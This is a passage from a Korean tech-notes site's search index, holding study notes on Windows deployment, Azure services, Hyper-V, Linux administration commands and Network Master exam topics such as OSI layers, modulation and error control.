서비스를 선택합니다.       Windows 배포 서비스에서 서버 구성을 진행합니다.       AD가 아닌 독립형 서버를 구성하므로, 하단을 선택합니다.       원격 폴더 설치의 위치를 설정합니다.       아무 사용자나 설치가 가능하게 설정합니다.       설치가 완료되면 하단의 그림과 같이 설정이 완료됩니다.       이미지를 추가합니다.       이미지를 추가 후, 서버를 시작하고 같은 네트워크 대역의 다른 PC에서 CD 파일 없이도 설치가 가능해집니다.                        "}),a.add({id:184,href:'/docs/azure/microsoftazure/azure07/',title:"Azure AI",content:"Azure AI    클라우드 컴퓨팅과 관련된 AI는 광범위한 서비스에 기반을 두고 있으며, 그 중 Machine Learning이 핵심입니다. Machine Learning은 컴퓨터에서 기존 데이터를 사용하여 미래 동작, 결과 및 추세를 예측하는 데이터 과학 기술입니다. Machine Learning을 사용하면 컴퓨터에서 명시적으로 프로그래밍하지 않고 학습합니다.     Azure Machine Learning   서비스	기계 학습 모델의 개발, 교육, 테스트, 배포, 관리 및 추적에 사용할 수 있는 클라우드 기반 환경입니다. 모델을 자동으로 생성하여 사용자에 맞게 조정할 수 있습니다. 이를 사용하면 로컬 머신의 학습을 시작한 다음, 클라우드로 확장할 수 있습니다.     Azure Machine Learning Studio  미리 빌드된 기계 학습 알고리즘 및 데이터 처리 모듈을 사용하여 기계 학습 솔루션을 빌드, 테스트, 배포할 수 있는 끌어서 놓기 방식의 시각적 공동 작업 영역     Cognitive Services   밀접한 관련이 있는 제품 세트     Vision   사진과 동영상의 스마트한 식별, 캡션, 인덱싱, 중재를 수행하는 이미지 처리 알고리즘     Speech   음성을 텍스트로 변환하거나, 음성을 인증에 사용하거나, 앱에 화자 인식을 추가     지식 매핑   지능형 추천 및 의미 체계 검색 등의 작업을 해결하기 위해 복잡한 정보와 데이터를 매핑     Bing Search   Add Bing Search API를 앱에 추가하고 단일 API 호출 기능을 활용하여 수십억 개의 웹 페이지, 이미지, 동영상 및 뉴스를 철저히 검색하는 기능을 활용가능     자연어 처리   미리 빌드된 스크립트를 사용하여 자연어를 처리하고, 감정을 평가하고, 사용자가 원하는 것을 인식    "}),a.add({id:185,href:'/docs/system/window/window17/',title:"Hyper-V",content:"Windows 가상화   Hyper-V의 정의    Hyper-V는 Windows Server에 내장되어 있는 가상화 기술로, 최신의 인텔 및 AMD CPU의 강력한 하드웨어 가상화 기술로 사용되어지고 있습니다.\n  hosts 파일을 이용하여 네트워크를 접속할 수 있으며, 기하급수적으로 늘어나는 네트워크 상의 컴퓨터에 대한 모든 IP 정보를 파일 하나에 기록하는 것이 무리이기 때문에 전문적으로 해석해주는 서버 컴퓨터가 필요해졌습니다.\n  Hyper-V의 장점\n  하드웨어 사용률을 높여 물리적인 서버의 운영 및 유지 관리비용 감소\n  테스트 환경을 재현하는 데 소요되는 시간을 줄여줍니다.\n  장애 조치구성에서 필요한 만큼의 물리적 컴퓨터를 사용하지 않아도 되므로 서버 가용성이 향상됩니다.\n       Hyper-V의 역사\n  Windows Server 2008에서 처음 내장되기 시작했습니다.\n  Windows Server 2008 R2에서는 그 기능이 더욱 향상\n  Windows Server 2012(R2 포함), 2016에서는 다양한 측면에서 기능이 개선\n       Hyper-V 실습    Hyper-V를 가상머신에서 사용하기 위해서는 추가적인 설정이 필요합니다.\n  먼저 FIRST가 설치되어 있는 Vmware의 진입하여 FIRST.vmx를 메모장로 실행하여 하단에 hypervisor.cpuid.v0=\u0026quot;FALSE\u0026quot;를 추가합니다.\n                                                                                       "}),a.add({id:186,href:'/docs/azure/microsoftazure/azure08/',title:"Azure DevOps",content:"Azure DevOps    Azure DevOps Services를 사용하여 애플리케이션에 연속 통합, 제공 및 배포를 제공하는 빌드 및 릴리스 파이프라인을 만들 수 있습니다. 리포지토리 및 애플리케이션 테스트를 통합하고, 애플리케이션 모니터링을 수행하고, 빌드 아티팩트로 작업할 수 있습니다.     Azure DevOps   Azure DevOps Services(이전 명칭: Visual Studio Team Services 또는 VSTS)는 고성능 파이프라인, 무료 비공개 Git 리포지토리, 구성 가능한 Kanban 보드, 광범위한 자동 및 클라우드 기반 부하 테스트를 비롯한 개발 협업 도구를 제공합니다.     Azure DevTest Labs  배포 파이프라인에서 바로 애플리케이션을 테스트하거나 시연하는 데 사용할 수 있는 주문형 Windows 및 Linux 환경을 신속하게 만듭니다.    "}),a.add({id:187,href:'/docs/azure/microsoftazure/azure09/',title:"Azure HybridCloud",content:"****   ****         ****        "}),a.add({id:188,href:'/docs/development/golang/',title:"Golang",content:"Go lang  Go lang docs  Go lang 정리       Go lang Training   작성 중\n  작성 중     "}),a.add({id:189,href:'/docs/development/web/',title:"Web",content:"Web   HTML 문법    CSS 문법     Django\n Django란? Django Install Django DB(model) create      "}),a.add({id:190,href:'/docs/development/',title:"development",content:""}),a.add({id:191,href:'/docs/development/git/',title:"Git",content:"Git\u0026amp; Hugo   아직 정리중입니다!  "}),a.add({id:192,href:'/docs/system/linux/linux01/',title:"Linux System Management",content:"Linux   Linux System Management   Linux 시스템관리는 프로세스, 메모리 관리를 위해 주로 사용됩니다.      crontab   정기적으로 지정한 시간에 실행하고 싶은 명령어를 등록하여 사용되며, 스크립트를 통해 등록도 가능합니다.   주요 옵션     옵션 설명     -l 등록된 명령어 리스트 확인   -e 등록된 명령어 수정     crontab 등록   -e옵션으로 실행하면 크롭탭을 위한 파일이 열리며, vi에디터와 동일한 명령으로 필요한 명령어를 등록할 수 있습니다.   crontab 주기    crontab을 등록할 때는 실행하고자 하는 주기와 명령어를 입력하고, 주기는 분, 시, 일, 월, 요일의 형태로 입력합니다.\n  *는 모두를 의미하고, 순서는 분 기 일 월 요일입니다ㅣ.\n     주기 비고     분 0 ~ 59   시 0 ~ 23   일 1 ~ 31   월 1 ~ 12   요일 0 ~ 7(0, 7 일요일)        free   free는 메모리 사용량을 확인하는 명령어입니다.   주요 옵션     옵션 내용     -h 사람이 읽을 수 있는 GB, MB, KB 형태로 변경하여 출력   -s [second] 지정한 초 마다 이용량을 출력     사용예제   메모리 사용량 확인     이름 내용     total 전체 메모리 용량   used 사용중인 메모리 용량   free 유휴 메모리 용량   shared 공유 메모리 용량   buffers 버퍼 메모리 용량   cached 캐쉬 메모리 용량     주기적인 메모리 사용량 확인   메모리 사용량을 주기적으로 확인하는 방법은 -s 옵션을 이용하는 방법과 watch 명령을 이용하는 방법이 있습니다.  $ free -h -s 1 $ watch free -h     jobs   현재 계정에서 실행중인 작업을 표시합니다.   주요 옵션     옵션 내용     -l 프로세스 ID를 표시합니다.     사용예제  상태 | 내용 Running | 실행 중 Stoppend | 일시 중잔(Ctrl + Z) Terminated | 강제 종료(Kill 명령) Done | 정상종료\n    kill   kill은 프로세스를 종료하는 명령어로, 딘. 후속 처리 등의 작업이 존재하면 일반적인 kill로 종료가 불가능한데, 이 경우에도 -9옵션을 이용하면 프로세스를 강제 종료할 수 있습니다.   주요 옵션     시그널 번호 내용     HUP 1 프로세스에 재기동을 통지   INT 2 프로세스에 인터럽트를 통지   QUIT 3 프로세스에 정상종료를 통지   KILL 9 프로세스에 강제종료를 통지   TERM 15 프로세스에 종료를 통지   STOP 17 프로세스에 중단을 통지   CONT 19 프로세스에 재개를 통지        man   man은 명령어의 메뉴얼을 출력한느 명령어 입니다.    nohup    리눅스에서 프로그램을 실행할 때 사용자의 세션이 끊어지면(hangup) 프로그램도 함께 종료되는데, 처리에 오랜 시간이 걸릴경우에는 문제가 발생할 수 있습니다.\n  이를 대처하기 위해 nohup 명령어를 이용하면 사용자의 세션이 끊어져도 프로그램은 계속 실행되도록 할 수 있습니다.\n   사용예제  $ nohup test.sh $     pgrep   ps명령과 grep 명령을 동시에 실행하는 명령어로, 지정한 형식에 맞는 프로세스 번호를 반환하는 명령어입니다.   주요 옵션     옵션 내용     -f 문자열 패턴에 맞는 프로세스 반환        ps   ps는 프로세스의 정보를 표시하는 명령어입니다.   주요 옵션     옵션 내용     -e 현재 실행중인 모든 프로세스를 표시   -f 유저명, 시작시간을 표시   -u 유저명으로 검색   -o 사용자가 설정한 포맷으로 출력   -p [pid] 지정한 프로세스 정보만을 표시   -e f 프로세스의 관계를 트리형식으로 출력     사용예제   -o 옵션을 이용해서 현재 실행중인 프로세스의 정보 중 원하는 것만 확인하는 것도 가능합니다.      옵션 설명     user 유저명   pid 프로세스 ID   ppid 부모 프로세스 ID   rss 실제 메모리 사용량   pmem 메모리 사용률   pcpu cpu 사용률   time cpu 사용시간   etime 총 실행 시간   cmd 커맨드        sar    sar 명령어는 시스템이 운영 정보를 확인할 수 있는 명령어 입니다.\n  System Active Report의 약자로 CPU, 메모리, 소켓, I/O 등의 여러 정보를 확인할 수 있습니다.\n  만약 sar 패키지가 존재하지 않을 경우 yum -y install sysstat으로 패키지의 설치가 가능합니다.\n   주요 옵션     옵션 내용     -A 모든 정보를 출력   -u CPU 사용률 출력   -r 메모리 사용률 출력   -n DEV/EDEV/SOCK/FULL 네트워크 사용률 출력        top   프로세스의 정보를 실시간으로 표시하는 명령어입니다.   주요 옵션     옵션 내용     -d [second] 지정한 초(second)마다 갱신   -p [process id] 지정한 프로세스 ID의 정보만 출력   -c 커맨드를 실행 옵션을 포함해서 출력     프로세스 정보 칼럼     이름 내용     PID 프로세스 ID   USER 프로세스를 실행시킨 사용자   PR 프로세스 우선순위   NI NICE 값, 마이너스를 가진 NICE가 우선순위가 높음   VIRT 가상 메모리의 사용량(SWAP+RES)   RES 현재 페이지가 상주하고 있는 크기(Resident SIZE)   SHR 분할된 페이지, 프로세스에 의해 사용된 메모리를 나눈 메모리의 총합   S 프로세스의 상태   %CPU CPU 사용률   %MEM 메모리의 사용률   TIME+ 프로세스 시작 후 총 실행 시간   COMMAND 실행된 명령어     S칼럼 : 프로세스 상태     상태 내용     R 실행 중   S 대기 상태   D 대기 상태(종료 불가)   T 정지 상태   X 좀비 상태      헤더 : Cpu(s)     요약명 설명     us 사용자가 사용한 CPU 시간   sy 커널이 사용한 CPU 시간   ni niced 사용자 프로세스를 실행하는 데 소요 된 시간   id 대기시간   wa IO 대기시간   hi 하드웨어 인터럽트 사용시간   si 소프트웨어 인터럽트 사용시간   st 하이퍼바이저가 다른 프로세서를 처리하는 동안 가상 CPU가 대기하는 시간      단축키     키 설명     M 메모리 사용량 기준으로 정렬   P CPU 사용량 기준으로 정렬        unmae   uname은 시스템 정보를 표시하는 명령어입니다.   주요 옵션     옵션 내용     -a 모든 시스템의 정보를 표시   -n 호스트 명을 표시   -m 머신타입을 표시   -p 프로세스 타입을 표시   -s OS의 시스템 타입을 표시   -v 커널 정보를 표시        wait   wait는 실행한 프로세스가 종료되는 것을 대기하게 하는 명령어로, 여러작업을 동시에 실행할 때 모든 작업이 종료되는 것을 대기하게 하거나, 특정 작업이 종료되는 것을 기다릴 때 사용합니다.   사용예제  $ command1 \u0026amp; command2 \u0026amp; command3 \u0026amp; wait command4 # 백그라운드 작업 종료를 대기 wait 100 # 100 PID를 가진 프로세스가 종료되는 것을 대기     watch   watch는 주기적으로 명령어를 실행하고, 결과를 화면에 출력하는 명령어입니다.   주요 옵션     옵션 내용     -n 반복적으로 실행할 시간 간격, 기본 값을 2초   -d 변경되는 곳을 표시, 변경되는 문자를 문자와 같이 밝게 표시        which    명령어의 경로를 /(엘리어스)를 표시합니다.\n  지정한 명령어의 절대경로나 엘리어스를 표시합니다.\n   주요 옵션     옵션 내용     -a 환경변수 PATH에서 지정한 모든 경로를 표시합니다.        yes    같은 문자를 반복하여 출력하는 명령어 입니다.\n  파일 삭제, 원격 연결 등의 명령에서 y, n 등의 사용자 입력을 필요로 하는 경우 함께 사용하여 스크립트에서 사용자 입력을 처리할 수 있습니다.\n   "}),a.add({id:193,href:'/docs/network/nm/nm01/',title:"Network Master 2급 필기정리",content:"Network Master 2급   Network Master 필기정리  네트워크 개요  정보통신 (정보처리기능+정보전송기능)   개념   컴퓨터에 의한 정보처리기술과 정보전송기능이 통합된 형태\n  정보의 공유,변환,전송이 가능한 처리기술\n        특징\n  신속, 정확한 정보의전달.\n  신뢰성이 높고 광대역 전송이 가능.\n  정보 자원의 공유 및 이용.\n  거리와 시간의 한계 극복.\n  하드웨어 기술뿐만 아니라 소프트웨어 기술도 필요.\n  에러제어방식이 요구.\n        정보통신 3요소\n 정보원, 전송매체, 정보처리원        정보통신 시스템 기본구성요소\n  데이터 전송계: 단말장치(DTE), 데이터전송회선, 통신제어장치(CCU)\n  데이터전송회선 : 신호변환장치(DCE), 통신회선\n  데이터처리계: 컴퓨터(CPU,주변장치)\n       단말장치(DTE)  통신회선 양쪽 끝에 위치, 데이터 전송로에 적합한 신호나 데이터로 변환      통신회선  컴퓨터와 단말기간 또는 컴퓨터간에 상호간을 접속하는 통신로      통신제어장치  데이터 전송계와 처리계의 접점에 위치하여 각종 제어기능과 데이터를 처리하기에 알맞은 형태로 변형    네트워크 발전 단계\n  1단계 : 전화회선 이용한 음성회선\n  2단계 : 공중전화교환망(PSTN)- PC통신\n  3단계 : 고속고품질의 디지털 전용회선\n  4단계 : 광대역망을 이용한 데이터 전용 교환망\n  5단계 : 모든자료를 하나의 디지털 회선으로 통합 ISDN\n     전송회선  전송선로의 종류    유선\n  나선/꼬임선\n 철선에 구리를 입힌 피복하지 않은 전설을 연결한선 기후변화에 따른 감쇠현상과 혼신현상이큼, 가격이싸고 전송속도와 거리에 제약       동축케이블\n 주파수에 따른 신호세력의 감쇄나 전송 지연의 변화가 적다, TV나 CATV 회선에 적합       광섬유케이블\n 규소를 원료로 제작된 광섬유를 여러가닥 묶어서 만든 케이블 전송신호를 레저광으로 하여 전반사에 의해 도파되는 원리를 이용한 통신선로 방식           무선\n  지상마이크로파(TV,인공위성)\n 포물선 모양의 접시형 안테나인 마이크로웨이브파를 이용하여 정보전송    위성마이크로파\n  마이크로웨이브의 중계국인 통신위성을 이용하여 정보전송\n 라디오파   라디오 웨이브를 이용한 정보전송\n     광섬유 케이블의 구성요소   발광기 : 정보의 송신에서 정보에 해당되는 빛을 발생\n  수광기 : 빛을 받아들임\n  광 케이블 : 광신호를 전송하는 선로\n        광섬유 케이블의 특징\n  잡음이나 누화가 없다\n  광대역을 제공하여 데이터 전송율이 높다\n  설치비용이 비싸고 접속이나 분기가 어려움\n  보안성이 뛰어나다.\n       광통신   레이저, 발광 다이오드 등에서 나오는 광파를 반송파로 이용하는 통신방식\n  공간, 광섬유, 빔 등을 전송매체로 이용하며, 빛의 세기를 변조하거나 pcm변조 등을 통해 광대역 전송\n  손실이 낮은 광섬유와 능률이 높고 수명이 긴 반도체 레이저 등이 개발됨에 따라 대용량 통신이 가능\n       전송회선   디지털 회선\n 이산적인 변화를 갖는 신호를 전송하는 회선으로 0과 1의 신호만을 전송 PCM(펄스 부호 변조기) 회선 사용    아날로그회선  사람의 목소리와 같이 연속적 변화를 갖는 신호를 전송          전송방식 분류\n  단방향 방식(Simplex) - 라디오,TV\n 어느 한 쪽이 송신 또는 수신만 가능한 형태         반이중 방식(Half Duplex) - FAX, 텔레스,무전기\n 양방향에서 송수신 할 수 있으나 동시에는 불가능한 방식.    전이중방식(Full Duplex) - 전화\n 동시에 양방향에서 송수신 할 수 있는 방식.       통신 속도\n  BPS(Bit Per Second)\n  1초당 전송되는 비트 수를 의미\n  데이터 신호 속도 = 변조속도(baud) * 변조시 상태 변화 수\n    BAUD(보오)\n  변조속도단위, 1초당 발생한 신호의 변화횟수\n  2비트- dibit, 3비트- tribit, 4비트- quadbit\n  펄스당 4개의 비트를 전송할 수 있는 선로에서 초당 200개의 펄스를 전송할때 BPS,BAUD?\n  BPS = 4 * 200 = 800Bps ,BAUD= 200Baud (초당)\n       샤논의 정리   통신용량 (잡음은 줄이고, 대역폭과 신호전력은 커야함)\n  단위시간에 전송회선이 최대로 전송할 수 있는 정보량\n  통신용량 = Blog2(1+S/N)   B:대역폭, S:신호전력, N:잡음\n       정보전송방식    회선 접속방식에 의한 전송방식\n 점 대 점 회선전송방식(POINT TO POINT)   두 장치 간의 전송매체가 직접 연결되어 있는 형태\n  데이터 전송에 책임을 지는 쪽 - 주국, 송신한 데이터를 수신하는 쪽 - 종국\n        멀티포인트 전송방식(MULTI POINT)   하나의 회선에 여러 단말기를 접속하는 방식\n  폴링 - 송신할 데이터가 있는지를 물어보는 것을 의미\n  셀렉션 - 데이터 수신할 수 있는지 물어보는 것을 의미\n        회선제어절차\n 회선접속(물리적통신) - 데이터링크확립(논리적경로) - 메시지전송 - 데이터링크해제 - 회선접속해제        직렬 및 병렬 전송방식\n  직렬전송\n  하나의 문자를 구성하는 각 비트들이 하나의 전송선을 통하여 순서적으로 전송하는 방식\n  원거리 전송, 데이터 통신에서 사용\n    병렬전송\n  각 비트들이 여러 개의 전송선을 통하여 동시에 전송하는 방식\n  컴퓨터와 주변장치 사이의 데이터 전송방식에 사용\n      동기/비동기 전송방식\n  동기식 전송 정해진 블록단위로 데이터전송 전숑효율과 전송속도가 높음 단말기는 반드시 버퍼기억장치를 내장 정보의 프레임 구성에 따라 문자위주 동기방식과 비트 위주 동기방식으로 구성 프레임 구조가 125ms 단위로 구성\n  비동기식 전송 한 번에 한 글자씩 데이터 전송 스타트 비트와 스톱비트를 추가하여 한 번에 5~8비트씩 데이터 전송 각 문자와 문자 사이의 유휴시간이 일정하지 않음 전송효율이 나빠 단거리의 저속데이터 전송에 사용\n  start 1 1 0 parity stop 데이터 전송방식 1.기저대역전송(baseband)\n 디지털 형태로 표시되는 컴퓨터나 단말기의 출력신호를 변조하지 않고 그대로 전송하는 방식. 근거리 통신에 적합하고 컴퓨터 주변기기간의 통신 등에 사용  종류\n  Rz(Return to Zero) 비트신호가 전송될 때 마다 상태가 변함. 0.5시간마다 +,- 상태 유지 후 0 상태로 복귀\n  NRZ(Non- Return to Zero) 비트신호 시간만큼 +, 1상태를 유지\n  Bipolar(양극성) : 데이터, 이더넷, 토큰링 신호가 세개의 상태로 변하는 것으로 펄스의 유무나 극성으로 내용을 표현 기법이 단순하고 설치가 용이\n  광대역 전송(broadband) : B- ISDN, 케이블TV 하나의 전송매체에 여러채널의 데이터를 실어서 동시에 전송하는 방식. 하나의 전송매체로 음성, 데이터, 영상과 같은 멀티미디어 서비스를 제공할 수 있음. 변조작업을 거쳐 전송하므로 장거리 데이터 전송이 가능. 복잡한 기술과 설치시 비용이 비쌈\n신호변환 전송방식 1.아날로그 변조 : 아날로그 데이터 - \u0026gt; 아날로그 회선으로 전송 종류 진폭변조(AM)- 변조파형에 따라 진폭을 변조 주파수변조(FM)- 변조파형에 따라 주파수를 변조 위상편조(PM)- 변조 파형에 따라 위상을 변조\n2.PCM(펄스코드변조방식) : 아날로그- \u0026gt; 디지털신호로 전송 입력 - \u0026gt; 표본화 - \u0026gt; 양자화 - \u0026gt;부호화 (순서만 잘나옴)\n3.디지털 변조방식 : 디지털데이터 - \u0026gt; 아날로그 신호 진폭 편이변조(ASK) 일정진폭의 반송신호 유무에 따라 2진 신호를 표현하는 방식의 모뎀 잡음등이 레벨변동에 약함 1200~2400bps의 속도\n주파수 편이변조(FSK) 부호 0과 1에 각각 다른 주파수를 할당하는 방식 레벨변동에 영향을 받지 않고 고속전송에는 부적합 비동기식으로 2000bps이하의 속도\n위상편이변조(PSK) 일정 주파수와 진폭의 정현파 위상을 2,3,8등분으로 나누어 각각 0 또는 1을 대응시키거나 2비트 혹은 3비트씩 한번에 할당하는 방식 2400~4800의 속도를 가짐. 데이터 전송에 가장 적합한 동기방식 2위상 - 1회의 변조로 1BIT 사용 (2의1승) 4위상 - 1회의 변조로 2BIT 사용 (2의2승) 8위상 - 1회의 변조로 3BIT 사용 (2의3승)\nM=2의전송비트수 = LOG2M (M- 위상편이변조)\n진폭위상편이변조(QAM,직교변조) 진폭편이와 위상편이변조를 혼합한 방식으로 반송파의 진폭 및 위상을 상호 변환하여 신호를 싣는 변조방식\n4.정보전송방식\n에러종류와 원인 1.감쇠현상 전송신호가 전송매체를 통과하는 과정에서 점점 신호세기가 약해짐 해결방법: 아날로그 전송시 증폭기사용, 디지털전송시 리피터 설치\n2.지연왜곡 전송매체를 통한 신호전달이 주파수에 따라 그 속도를 달리함으로써 유발되는 신호손상\n3.잡음 열 잡음(백색잡음) - 가청 주파수의 모든 진동 스펙트럼을 고르게 포함한 잡음.열의 온도에 이의해 발생 충격잡음 - 전송시스템이 순간적으로 일어나는 높은 진폭의 잡음으로 주로 기계적인 충격, 낙뢰등의 자연현상 누화잡음 - 상호 인접한 전송매체의 전자기적 상호 유도 작용에 의해 발생하는 잡음 상호변조잡음 - 서로 다른 주파수들이 똑같은 전송 매체를 공유할 때 주파수들의 신호의 차이로 발생\n4.에코 선로상에 임피던스의 변화가 있을 때 약해진 신호가 송신측으로 되돌아오는 것\n5.위상지터 연속적으로 위상이 변하여 위상 사이의 편차가 커지는 것을 의미\n전송에러제어방식 1.반복전송방식 송신측에서 동일한 데이터를 2번이상 연속하여 전송하고 수신측에서 이들 수신된 데이터를 비교하여 오류여부확인하는 방식\n2.궤환전송방식 전송된 데이터와 수신측을 경유하여 송신측으로 궤환된 데이터를 비교하여 검사하는 방식으로 전송하고자하는 데이터마다 2번이상의 전송이 필요하므로 전송요량의 낭비 발생\n3.전진오류수정(FEC)방식 정보 비트외에 오류의 검출 및 정정이 가능한 부가 코드를 함께하여 전송하여 수신측에서 이 부호를 이용하여 오류를 검출하고 자체적인 수정을 행하는 방식 ★해밍코드, 순환잉여검사(CRC)등\n4.후진오류수정(BEC) 데이터 전송 과정에서 오류가 발생하면 수신측에서 재전송을 요구하는 방식 ★자동반복(ARQ)등이 해당\nARQ 종류 1.정지- 대기 ARQ 송신측이 하나의 블록을 전송한 후 수신측으로 부터 응답(ACK/NAK)을 기다리는 방식.\n2.연속적 ARQ GO- BACK N ARQ 여러 블록을 연속하여 전송하고, 수신츠긍로 부터 NAK신호를 받으면 에러가 발생한 블록 이후 모든 데이터를 재전송. 선택적 재전송 ARQ 여러 블록을 연속하여 전송시 수신측으로부터 NAK신호를 받으면 에러가 발생한 블록만 선택하여 재전송.\n3.적응적 ARQ 전송효율을 높이기 위해 블록의 길이를 동적으로 변경하여 전송하는 방식.\n에러 검출 방식 1.패리티 검사 전송되는 문자마다 1개의 패리티 비트를 추가하여 EVEN(우수) 또는 ODD(기수) 검사방법으로 오츄검출\n2.CRC(순환중복검사) 블록마다 검사용 코드를 부가시켜 전송하는 방식 데이터를 연속하여 전송하는 경우 집단 오류 검출을 위해 사용 주로 동기식 전송에서 많이 사용\n3.해밍코드 방식 에러를 검출하여 교정까지 할 수 있는 코드 자기 정정 부호의 하나로 비트 착오를 검출하여 1비트 착오를 정정하는 부호 방식 고속의 동기식 전송에서 사용\n다중화기 하나의 통신회선을 공유하여 여러개의 단말기가 컴퓨터에 접속할 수 있도록 하여 신호를 전송하고 이를 수신측에서 다시 몇개의 신호로 분리해주는 기기를 의미\n주파수분할 다중화방식(FDM) 하나의 주파수 대역을 몇개의 대역폭으로 나누어 각 대역폭에 서로 다른 반송파를 실어 동시에 전송 채널간의 잡음막기위한 가드밴드가 필요, 모뎀이 필요없어 가격이 저렴하고 저속전송에 적합\n시분할 다중화방식(TDM) 전송로의 데이터 전송을 위한 시간을 나누어 각 시간대에 서로 다른 신호를 전송(타임슬롯) 1.동기식 시분할 다중화방식 각 터미널에 대해 전송할 내용이 있든 없든 동일한 타임슬롯을 할당(낭비발생)\n2.비동기식(지능형,통계적) 시분할 다중화방식 전송할 내용이 있는 터미널에 대해서만 시간을 할당하여 전송 효율을 높이는 방식\n역다중화기 다중화기와 반대로 고속의 두개의 낮은 속도를 가진 선로로 변환하여 음성대역의 변복조기를 이용하여 전송하고 수신측에서 다시 원래의 고속의 속도를 만들어냄\n집중화기 여러개 채널을 몇개의 소수회선으로 공유시키는 방식\n5.프로토콜\n프로토콜 개념 컴퓨터와 컴퓨터, 정보통신망에서 원거리에 있는 통신 개체 사이의 정확한 데이터의 송수신을 위해 필요한 일련의 통신규칙\n기능 단편화 - 전송 블록을 같은 크기의 작은 블록으로 나누어 데이터 전송 재합성 - 단편화 된 데이터를 수신측에서 재구성하여 복원. 캡슐화 - 데이터에 제어정보를 추가하여 각 프로토콜에 적합한 데이터 블록이 되도록 함. 흐름제어 - 데이터의 양이나 통신속도 등 수신측의 처리능력을 초과하지 않도록 조정. 에러제어 - 오류나 착오등을 검출하고 정정. 순서제어 - 송신 데이터 순서대로 수신측에 전달. 연결제어 - 비연결 데이터전송, 가상회선을 위한 통신로의 개설, 유지, 종료. 주소지정 - 발생지, 목적지 등의 주소를 지정하여 정확한 송신을 하게함. 동기화 - 두 통신 개체간의 상태를 일치시킴. 다중화 - 하나의 통신로를 다수의 가입자들이 동시에 사용할 수 있도록 함.\n기본요소 구문(sysntax), 의미(semantic), 타이밍(timing)\n프로토콜 전송방식 1.문자방식 전송데이터의 처음과 끝에 동기를 위한 전송 제어문자를 포함하여 전송 대표적인 문자 방식의 프로토콜 - \u0026gt; BSC 프로토콜\n제어문자정보 SOH 정보메시지의 헤딩 시작 STX 텍스트 시작 및 헤딩 종료 ETX 텍스트의 끝 EOT 전송을 종료, 데이터링크를 초기화 ENQ 데이터 링크 설정 및 응답요구 ACK 수신한 정보메시지에 대한 긍정응답 NAK 수신한 정보메시지에 대한 부정응답 SYN 문자 동기를 유지 BCC 오류 검출을 위한 코드 ETB 전송 블록의 끝 DLE 타 전송문자와 조합하여 의미를 바꿈\n2.바이트(BYTE) 방식 전송 데이터의 헤더에 데이터 문자수, 메시지 수신 상태 등 제어 정보를 포함하여 전송 (DDCM 프로토콜)\n3.비트(BIT)방식 전송 데이터의 처음과 끝에 특수한 플래그 비트를 포함하여 메시지를 구성하여 전송 (HDLC,SDLC,ADCCP,X.25프로토콜)\nHLDC 프로토콜 ISO에서 지정한 고속 전송용 비트 방식의 프로토콜 전송효율의 향상, 신뢰성 향상, 부호에 대한 독립성 포인트 투 포인트, 멀티 포인트, 루프 접속 방식등 다양한 데이터 링크에서 사용가능 흐름제어를 위해 슬라이딩 윈도우기법 사용 Go Back B ARQ, 선택적 재전송 ARQ를 이용한 에러제어 방식\nFlag 주소부 제어영역 정보영역 프레임검사(FCS) Flag 국제 표준화 기구 ITU(International Telecommunications Union) 국제전신연합에서 국제전기통신엽합으로 발전한 기구 무선통신과 전기통신을 표준화 ITU- T 전기통신분야의 표준화를 다룸\nEIA(Electronic Industries Association) 미국전자공업협회로 통신조건의 표준화를 위해 창설된 전자제품 생산업자들의 모임 RS- 232C : 단말기와 모뎀간의 인터페이스 표준\nISO(Intertaional Standards Organization) 1947년 설립한 국제표준화기구로 기계공학분야에서 광범위한 분야의 표준화 시작\nIEEE(Institute of Electronics Engineers) 미국의 전기학회(AIEE)와 무선학회(IRE)가 합쳐진 미국전기전자기술자협회 전자, 통신, 컴퓨터 시스템등의 전문 기술단체로 근거리통신만(LAN)의 표준을 규정 OSI 7계층 1.물리계층 : 물리적 매체를 통한 전송 전기적, 기계적, 기능적, 절차적 특성 프로토콜:RS- 232C,X.21,V.21\n2.데이터링크계층 : 오류없이 데이터 전달할 수 있도록 함, 데이터전송, 오류제어,흐름제어, 프레임동기 링크효율 향상 표준프로토콜: HDLC, LAPB, PAPD\n3.네트워크계층 : 패킷을 목적지까지 전달하는 역할 패킷정보전송, 교환기능, 경로선택, 트래픽제어 IP,X.25\n4.전송계층 : 시스템 종단간 오류수정, 흐름제어, 수행하여 신뢰성있고 정확한 데이터 전송 역할 수행 전송데이터의 다중화, 집중화, 주소지정 TCP,UDP\n5.세션계층 : 통신시스템간의 상호작용, 동기화, 프로세스간 동기제어기능수행\n6.표현계층 : 세션계층에서 받은 데이터를 응용계층에 적합한 형태로 변환 암호화, 압축, 코드변환, 구문검색 기능 수행\n7.응용계층 : 사용자가 네트워크에 접근할수 있도록 인터페이스와 서비스 제공 프로토콜 : HTTP, FTP, SMTP\nDTC/DCE접속규격 기계적 특성 - 연결기기 크기, 핀의개수 등 물리적 연결규정 전기적 특성 - DTE와 DCE간 커넥터에 전압레벨, 전압변동, 잡음등 전기적 신호법 규정 기능적 특성 - RS- 232S 주요 핀 이름처럼 각 회선에 의미를 부여 절차적 특성 - 데이터를 전송하기 위한 흐름의 순서를 규정\n1.물리계층 (리피터,허브) ★ 비트단위 전송 2.데이터링크계층 (브릿지) ★ 프레임단위 전송 3.네트워크계층 (라우터) ★ 패킷단위 전송 4.전송계층 게이트웨이 ★메시지전송 5.세션계층 게이트웨이 ★메시지전송 6.표현계층 게이트웨이 ★메시지전송 7.응용계층 게이트웨이 ★메시지전송\nPhysical - BitDatalink - FrameNetwork - Packet or DatagramTransport - Segment상위3계층 - Message\n6.통신망\n통신망 둘 이상의 지점간의 의사 또는 정보를 전달하기 위한 신호변환, 선택수단, 전송수단등의 구성요소로 이루어진 종합적인 체계를 의미\n토폴로지 정보전달하는 매체를 통해 네트워크가 배열되어 있는 형태 토폴로지 종류 트리형 - 분산 처리 시스템을 구성하며 통신선로가 짧다 링형 - 양쪽 방햑으로 접근가능하여 통신회선 장애에 대해서 유연, 근거리 통신망에서 사용 스타형 - 중앙에 호스트 컴퓨터를 중심으로 터미널들이 연결되어 있는 중앙집중형, 중앙 컴퓨터 오류 발생시 전체 시스템 마비 망형 - 모든 단말기와 단말기들을 통신회선으로 연결시킨 구조로 공중데이터 통신망에서 주로사용, 노드의 연결성 높음 버스형 - 하나의 통신회선에 여러대의 단말기들을 접속하여 연결한 구조, 물리적구조가 단순하고 단말기 추가삭제가 용이, 회선에 이상이 생기면 전체 시스템 마비\n교환망 : 여러 개 통신회선의 중간에서 각각의 노드들이 전송하는 데이터를 원하는 곳으로 전송해주는 기법 회선 교환망 컴퓨터와 단말기 혹은 컴퓨터간의 데이터 교환이 아닌 회선자체를 교환 대량의 정보를 송수신할 